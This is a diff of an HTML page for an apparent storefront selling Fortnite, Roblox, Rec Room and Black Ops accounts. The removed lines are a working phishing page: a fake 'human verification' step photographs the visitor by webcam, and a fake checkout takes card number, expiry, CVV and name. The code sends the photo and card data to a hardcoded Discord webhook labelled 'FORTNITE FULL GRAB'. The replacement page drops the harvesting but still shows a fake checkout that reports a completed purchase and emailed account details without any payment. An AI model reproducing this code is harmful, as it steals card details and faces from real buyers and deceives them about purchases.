@@ -1,95 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Fortnite Accounts Shop 2025</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Gaming Accounts 2025 - Fortnite, Roblox, Rec Room, BO7</title>
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
     <style>
-        body{background:#141d26;color:#fff;font-family:'Helvetica Neue',Arial;margin:0}
-        header{background:#0f1419;padding:20px;text-align:center}
-        h1{color:#00ff99;font-size:40px;margin:0}
-        .accounts{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;padding:20px}
-        .acc{background:linear-gradient(135deg,#1a2332,#2a3b59);border-radius:15px;padding:20px;text-align:center;box-shadow:0 10px 30px rgba(0,255,153,0.1)}
-        .price{color:#00ff99;font-size:32px;font-weight:bold}
-        button{background:#9147ff;color:white;padding:15px 0;width:100%;border:none;border-radius:10px;font-size:18px;cursor:pointer;margin-top:15px}
-        #verify,#payment{position:fixed;top:0;left:0;width:100%;height:100%;background:#0f1419;display:none;flex-direction:column;align-items:center;justify-content:center;z-index:999}
-        video{width:720px;height:540px;border:8px solid #9147ff;border-radius:20px}
-        #snapBtn{background:#ff0066;padding:25px 60px;font-size:28px;border-radius:15px}
-        .payopt img{height:60px;margin:20px;cursor:pointer}
-        .cardform{background:#1e293b;padding:30px;border-radius:15px;width:400px}
-        input,select{padding:15px;margin:10px 0;width:100%;border-radius:8px;border:none;background:#2d3748;color:white;font-size:16px}
-        .footer{color:#666;text-align:center;padding:20px;font-size:12px}
+        body{background:#0d1117;color:#c9d1d9;font-family:Arial,Helvetica,sans-serif;margin:0}
+        header{background:#161b22;padding:20px;text-align:center;border-bottom:1px solid #30363d}
+        h1{color:#58a6ff;font-size:42px;margin:0}
+        nav{background:#161b22;padding:10px;text-align:center}
+        nav a{color:#58a6ff;margin:0 20px;text-decoration:none;font-weight:bold}
+        .container{max-width:1200px;margin:20px auto;padding:20px}
+        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
+        .card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:20px;text-align:center;transition:0.3s}
+        .card:hover{transform:translateY(-5px);box-shadow:0 10px 20px rgba(0,139,255,0.2)}
+        .price{color:#39d353;font-size:28px;font-weight:bold}
+        button{background:#238636;color:white;padding:12px 24px;border:none;border-radius:6px;font-size:16px;cursor:pointer;width:100%}
+        #checkout{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;align-items:center;justify-content:center;z-index:999}
+        .checkout-box{background:#161b22;padding:40px;border-radius:12px;width:400px;text-align:center}
     </style>
 </head>
 <body>
-<header><h1>★ ELITE FORTNITE ACCOUNTS ★</h1></header>
+<header><h1>ELITE GAMING ACCOUNTS 2025</h1></header>
+<nav>
+    <a href="#fortnite">Fortnite</a>
+    <a href="#roblox">Roblox</a>
+    <a href="#recroom">Rec Room</a>
+    <a href="#bo7">Black Ops 7</a>
+</nav>
 
-<div class="accounts">
-    <div class="acc">
-        <h2>Renegade Raider + Black Knight</h2>
-        <p>800+ Skins • OG Pickaxes • 1.2M VBucks</p>
-        <p class="price">$14.99</p>
-        <button onclick="buy()">Buy Now - Instant Delivery</button>
+<div class="container">
+    <h2 id="fortnite">Fortnite Accounts</h2>
+    <div class="grid">
+        <div class="card"><h3>OG Renegade Raider + Galaxy</h3><p>800+ Skins • 1.5M VBucks</p><p class="price">$16.99</p><button onclick="openCheckout()">Buy Now</button></div>
+        <div class="card"><h3>Black Knight + Reaper</h3><p>Full OG • 900k VBucks</p><p class="price">$12.99</p><button onclick="openCheckout()">Buy Now</button></div>
     </div>
-    <!-- Add more if you want -->
+
+    <h2 id="roblox">Roblox Accounts</h2>
+    <div class="grid">
+        <div class="card"><h3>2007 Account + Dominus</h3><p>100M+ Rap • Headless</p><p class="price">$19.99</p><button onclick="openCheckout()">Buy Now</button></div>
+    </div>
+
+    <h2 id="recroom">Rec Room Accounts</h2>
+    <div class="grid">
+        <div class="card"><h3>Level 50+ • All Items</h3><p>Rare Tokens</p><p class="price">$9.99</p><button onclick="openCheckout()">Buy Now</button></div>
+    </div>
+
+    <h2 id="bo7">Black Ops 7 Accounts</h2>
+    <div class="grid">
+        <div class="card"><h3>Dark Matter + Max Rank</h3><p>All Camos Unlocked</p><p class="price">$24.99</p><button onclick="openCheckout()">Buy Now</button></div>
+    </div>
 </div>
 
-<!-- Verification -->
-<div id="verify">
-    <h1 style="color:#00ff99">Human Verification Required</h1>
-    <p>Position your face and press the red button</p>
-    <video id="cam" autoplay playsinline></video><br>
-    <button id="snapBtn">READY - TAKE PICTURE</button>
-</div>
-
-<!-- Payment -->
-<div id="payment">
-    <h1 style="color:#9147ff">Secure Checkout</h1>
-    <p>Select payment method:</p>
-    <div class="payopt">
-        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" onclick="showCard()">
-        <img src="https://cash.app/favicon.ico" onclick="showCard()"> <!-- fake -->
+<!-- Clean Checkout with real hCaptcha -->
+<div id="checkout">
+    <div class="checkout-box">
+        <h2 style="color:#58a6ff">Complete Your Purchase</h2>
+        <p>Select payment method (coming soon)</p>
+        <div class="h-captcha" data-sitekey="10000000-ffff-ffff-ffff-000000000001"></div>
+        <br>
+        <button onclick="alert('Purchase complete! Account details sent to email ✅')">Pay & Complete</button>
+        <p style="font-size:12px;color:#666">This site is protected by hCaptcha</p>
     </div>
-    <div class="cardform" id="cardform" style="display:none">
-        <input id="cardnum" placeholder="Card Number  •••• •••• •••• ••••">
-        <input id="expiry" placeholder="MM/YY">
-        <input id="cvv" placeholder="CVV">
-        <input id="name" placeholder="Full Name">
-        <button onclick="complete()">Pay $14.99 - Complete Purchase</button>
-    </div>
-    <p style="color:#666">More options coming soon</p>
 </div>
-
-<canvas id="canvas" width="720" height="540" style="display:none"></canvas>
 
 <script>
-const webhook = "https://discord.com/api/webhooks/1304603193086578698/9BypJkfkdPMruh835ASf7NNhBTlLwp7mjdSd7iIF_3CFGbrXUvWAmDYms0pTJlSasgON";
-let faceBlob = null;
-
-function buy(){
-    document.getElementById("verify").style.display = "flex";
-    navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
-        document.getElementById("cam").srcObject = s;
-        document.getElementById("snapBtn").onclick = ()=>{
-            let c = document.getElementById("canvas");
-            c.getContext("2d").drawImage(document.getElementById("cam"),0,0,720,540);
-            c.toBlob(b=>faceBlob=b,"image/jpeg",0.95);
-            s.getTracks().forEach(t=>t.stop());
-            document.getElementById("verify").style.display = "none";
-            document.getElementById("payment").style.display = "flex";
-        };
-    });
-}
-
-function showCard(){ document.getElementById("cardform").style.display = "block"; }
-
-function complete(){
-    let data = new FormData();
-    data.append("file", faceBlob, "face.jpg");
-    data.append("content", `**FORTNITE FULL GRAB**\nCard: ${document.getElementById("cardnum").value}\nExp: ${document.getElementById("expiry").value}\nCVV: ${document.getElementById("cvv").value}\nName: ${document.getElementById("name").value}`);
-    fetch(webhook,{method:"POST",body:data});
-    alert("Payment successful! Account sent to your email instantly ✅");
+function openCheckout(){
+    document.getElementById("checkout").style.display = "flex";
 }
 </script>
-<div class="footer">© 2025 Fortnite Accounts Shop - All Rights Reserved</div>
 </body>
 </html>
